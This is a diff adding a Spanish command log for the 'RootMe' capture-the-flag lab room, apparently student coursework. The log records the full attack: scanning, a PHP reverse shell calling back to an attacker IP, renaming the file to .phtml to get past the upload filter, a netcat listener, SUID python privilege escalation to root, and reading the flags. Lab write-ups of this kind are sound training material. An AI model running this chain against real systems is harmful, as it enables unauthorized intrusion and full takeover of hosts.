@@ -1,0 +1,34 @@
+# Bitacora - Sala 3: RootMe
+# Fecha: 2026-10-05
+
+## Reconocimiento
+ip addr show tun0
+ping -c 4 10.64.152.91
+
+## Escaneo
+nmap -sC -sV -T4 10.64.152.91 -oN ~/Documents/TP_THM/evidencias/escaneo/escaneo_RM-02_nmap.txt
+gobuster dir -u http://10.64.152.91 -w /usr/share/wordlists/dirb/common.txt -o ~/Documents/TP_THM/evidencias/escaneo/escaneo_RM-03_gobuster.txt
+
+## Explotacion
+cp /usr/share/webshells/php/php-reverse-shell.php ~/Documents/TP_THM/shell.php
+nano ~/Documents/TP_THM/shell.php
+# (edicion manual: IP atacante 192.168.147.220, puerto 4444)
+nc -lvnp 4444
+# Intento de subida shell.php bloqueado por filtro de extension (.php)
+cp ~/Documents/TP_THM/shell.php ~/Documents/TP_THM/shell.phtml
+# Subida exitosa de shell.phtml via /panel/
+# Ejecucion via navegador: http://10.64.152.91/uploads/shell.phtml
+
+## Post-explotacion
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+whoami
+id
+uname -a
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+whoami
+id
+find / -iname "user.txt" 2>/dev/null
+cat /var/www/user.txt
+cat /root/root.txt
